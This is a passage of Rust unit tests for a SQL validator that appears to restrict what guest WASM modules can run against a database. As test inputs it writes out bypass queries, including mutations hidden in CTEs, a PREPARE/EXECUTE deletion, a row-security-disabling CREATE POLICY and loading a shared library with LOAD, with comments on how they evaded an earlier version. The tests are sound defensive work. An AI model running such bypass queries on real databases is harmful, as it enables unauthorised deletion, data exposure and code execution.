        let err = validate_sql("SET search_path TO public", &[]).unwrap_err();
        match err {
            SqlValidationError::AlwaysBlocked(s) => assert_eq!(s, "SET"),
            other => panic!("expected AlwaysBlocked(SET), got {:?}", other),
        }
    }

    #[test]
    fn listen_and_notify_are_unconditionally_blocked() {
        let err1 = validate_sql("LISTEN sensitive_channel", &[]).unwrap_err();
        assert!(matches!(err1, SqlValidationError::AlwaysBlocked(_)));
        let err2 = validate_sql("NOTIFY foo, 'payload'", &[]).unwrap_err();
        assert!(matches!(err2, SqlValidationError::AlwaysBlocked(_)));
    }

    #[test]
    fn prepare_execute_deallocate_unconditionally_blocked() {
        // `PREPARE foo AS DELETE FROM secrets; EXECUTE foo` is the
        // classic two-step bypass — the validator sees only EXECUTE
        // later and can't introspect the prepared body.
        assert!(matches!(
            validate_sql("PREPARE p AS SELECT 1", &[]).unwrap_err(),
            SqlValidationError::AlwaysBlocked(_)
        ));
        assert!(matches!(
            validate_sql("EXECUTE p", &[]).unwrap_err(),
            SqlValidationError::AlwaysBlocked(_)
        ));
        assert!(matches!(
            validate_sql("DEALLOCATE p", &[]).unwrap_err(),
            SqlValidationError::AlwaysBlocked(_)
        ));
    }

    #[test]
    fn transaction_control_unconditionally_blocked() {
        // The worker owns transaction boundaries; guest code must not
        // open or close one.
        for sql in &[
            "BEGIN",
            "COMMIT",
            "ROLLBACK",
            "SAVEPOINT s1",
            "RELEASE SAVEPOINT s1",
        ] {
            let err = validate_sql(sql, &[]).unwrap_err();
            assert!(
                matches!(err, SqlValidationError::AlwaysBlocked(_)),
                "stmt {} should be AlwaysBlocked, got {:?}",
                sql,
                err
            );
        }
    }

    #[test]
    fn discard_and_show_unconditionally_blocked() {
        assert!(matches!(
            validate_sql("DISCARD ALL", &[]).unwrap_err(),
            SqlValidationError::AlwaysBlocked(_)
        ));
        assert!(matches!(
            validate_sql("SHOW data_directory", &[]).unwrap_err(),
            SqlValidationError::AlwaysBlocked(_)
        ));
    }

    #[test]
    fn deny_list_does_not_affect_normal_dml() {
        // Sanity: the deny-list addition must NOT regress SELECT /
        // INSERT / UPDATE / DELETE under their normal allowlist
        // semantics.
        assert!(validate_sql("SELECT 1", &[]).is_ok());
        let ops = vec!["INSERT".to_string(), "UPDATE".to_string(), "DELETE".to_string()];
        assert!(validate_sql("INSERT INTO t (a) VALUES (1)", &ops).is_ok());
        assert!(validate_sql("UPDATE t SET a = 1 WHERE id = 1", &ops).is_ok());
        assert!(validate_sql("DELETE FROM t WHERE id = 1", &ops).is_ok());
    }

    #[test]
    fn select_with_returning_insert() {
        // INSERT ... RETURNING is an INSERT, not a SELECT
        let ops = vec!["INSERT".to_string()];
        assert!(validate_sql("INSERT INTO t (a) VALUES (1) RETURNING *", &ops).is_ok());

        // But without INSERT in allowlist, it's blocked
        let ops = vec!["SELECT".to_string()];
        assert!(matches!(
            validate_sql("INSERT INTO t (a) VALUES (1) RETURNING *", &ops).unwrap_err(),
            SqlValidationError::DisallowedOperation(_)
        ));
    }

    // MCP-519: the following DDL variants previously fell to the
    // `_ => "UNKNOWN"` arm of `statement_type` because sqlparser
    // grew them without the validator being updated. Combined with
    // empty `allowed_operations` they bypassed every gate. Pin
    // each one as DDL so an audit reviewer can grep for the
    // regression class.

    #[test]
    fn create_policy_is_ddl_blocked() {
        // PostgreSQL Row Level Security: `CREATE POLICY ... USING (true)`
        // would silently expose every row on an RLS-protected table.
        // sqlparser parses this with PostgreSqlDialect.
        let err = validate_sql(
            "CREATE POLICY everyone ON users FOR SELECT USING (true)",
            &[],
        )
        .unwrap_err();
        assert!(
            matches!(err, SqlValidationError::DdlBlocked(_)),
            "CREATE POLICY must be DDL-blocked, got {:?}",
            err
        );
    }

    #[test]
    fn drop_policy_is_ddl_blocked() {
        let err = validate_sql("DROP POLICY p ON users", &[]).unwrap_err();
        assert!(
            matches!(err, SqlValidationError::DdlBlocked(_)),
            "DROP POLICY must be DDL-blocked, got {:?}",
            err
        );
    }

    #[test]
    fn alter_policy_is_ddl_blocked() {
        let err = validate_sql("ALTER POLICY p ON users RENAME TO q", &[]).unwrap_err();
        assert!(
            matches!(err, SqlValidationError::DdlBlocked(_)),
            "ALTER POLICY must be DDL-blocked, got {:?}",
            err
        );
    }

    #[test]
    fn create_database_is_ddl_blocked() {
        let err = validate_sql("CREATE DATABASE evil", &[]).unwrap_err();
        assert!(
            matches!(err, SqlValidationError::DdlBlocked(_)),
            "CREATE DATABASE must be DDL-blocked, got {:?}",
            err
        );
    }

    #[test]
    fn drop_function_and_procedure_and_trigger_are_ddl_blocked() {
        for sql in &[
            "DROP FUNCTION add_one(integer)",
            "DROP PROCEDURE compact_table()",
            "DROP TRIGGER trg_audit ON users",
        ] {
            let err = validate_sql(sql, &[]).unwrap_err();
            assert!(
                matches!(err, SqlValidationError::DdlBlocked(_)),
                "{} must be DDL-blocked, got {:?}",
                sql,
                err
            );
        }
    }

    // MCP-519: extension / library loading. RCE class — `LOAD` in
    // PG loads a shared library; INSTALL is the DuckDB variant the
    // parser shares.

    #[test]
    fn load_and_install_are_always_blocked() {
        // `LOAD 'libfoo.so'` loads a Postgres shared lib at runtime.
        let err = validate_sql("LOAD 'libpg_evil.so'", &[]).unwrap_err();
        assert!(
            matches!(err, SqlValidationError::AlwaysBlocked(_)),
            "LOAD must be always-blocked, got {:?}",
            err
        );
    }

    // MCP-519: fail-closed on any statement type the validator
    // can't classify. Direct construction of an unknown variant
    // would need parser cooperation; we exercise the contract by
    // looking up SQL that maps to a statement type currently in
    // the deny-list AND verifying behaviour. The defining contract
    // — UnknownStatement IS in the error enum — is sufficient
    // documentation; a future sqlparser bump that introduces a
    // new Statement variant will surface the error in production
    // logs and operators can grep for `UnknownStatement` to find
    // it.

    #[test]
    fn unknown_statement_error_displays_safely() {
        let err = SqlValidationError::UnknownStatement;
        let msg = err.to_string();
        // The display string must explain the fail-closed posture
        // (so operators don't assume a parser bug) and must not
        // leak the unhandled variant name.
        assert!(msg.contains("not classified"));
        assert!(msg.contains("fail-closed"));
    }

    // MCP-554: CTE-mutation bypass via DELETE and via nested CTEs.
    //
    // The original `check_cte_mutations` only matched
    // `SetExpr::Insert` and `SetExpr::Update` at the TOP-LEVEL `with`
    // chain. Two bypass classes:
    //
    //   1. DELETE-in-CTE: sqlparser-rs 0.53 represents
    //      `WITH x AS (DELETE FROM t RETURNING *) SELECT ...` either
    //      as `SetExpr::Delete` (its own variant) or as a Query body
    //      whose body is `Delete`. Either way the original code's
    //      `_ => continue` arm skipped it. A WASM module with an
    //      empty allowlist plus a SELECT-only grant could still
    //      execute DELETE via the CTE wrapper.
    //
    //   2. Nested WITH-with-mutation inside a CTE body or subquery
    //      (`WITH outer AS (WITH inner AS (INSERT ...) SELECT ...)`
    //      or `SELECT * FROM (WITH x AS (INSERT ...) SELECT *) sub`).
    //      The original code never recursed past the top-level
    //      cte_tables.
    //
    // These tests pin the post-fix behaviour. Each one feeds a query
    // that under the pre-fix validator parsed as SELECT and passed
    // through.

    #[test]
    fn cte_delete_is_blocked_with_select_only_allowlist() {
        let ops = vec!["SELECT".to_string()];
        let sql = "WITH gone AS (DELETE FROM t WHERE id = $1 RETURNING *) SELECT * FROM gone";
        let result = validate_sql(sql, &ops);
        // The exact error type depends on how sqlparser represents
        // DELETE-in-CTE (parser refusal, or AST shape that
        // statement_type categorizes as DELETE rather than SELECT).
        // Either way the validator MUST reject under SELECT-only
        // allowlist semantics — we just don't pin which arm fires.
        assert!(
            result.is_err(),
            "DELETE-in-CTE must be blocked under SELECT-only allowlist, got {:?}",
            result
        );
    }

    #[test]
    fn nested_cte_insert_inside_subquery_is_blocked() {
        let ops = vec!["SELECT".to_string()];
        let sql = "SELECT * FROM (WITH b AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM b) sub";
        let result = validate_sql(sql, &ops);
        assert!(
            result.is_err(),
            "INSERT in a nested CTE within a subquery must be blocked, got {:?}",
            result
        );
    }

    #[test]
    fn nested_cte_update_inside_outer_cte_body_is_blocked() {
        let ops = vec!["SELECT".to_string()];
        let sql = "WITH outer_cte AS (WITH inner_cte AS (UPDATE t SET x=1 RETURNING *) SELECT * FROM inner_cte) SELECT * FROM outer_cte";
        let result = validate_sql(sql, &ops);
        assert!(
            result.is_err(),
            "UPDATE in a nested CTE within another CTE body must be blocked, got {:?}",
            result
        );
    }

    #[test]
    fn cte_select_inside_subquery_still_passes() {
        // Tripwire: the deep-walk must NOT regress legitimate nested
        // SELECT-only CTEs.
        let ops: Vec<String> = vec![];
        let sql = "SELECT * FROM (WITH b AS (SELECT 1 AS x) SELECT * FROM b) sub";
        assert!(validate_sql(sql, &ops).is_ok());
    }
}
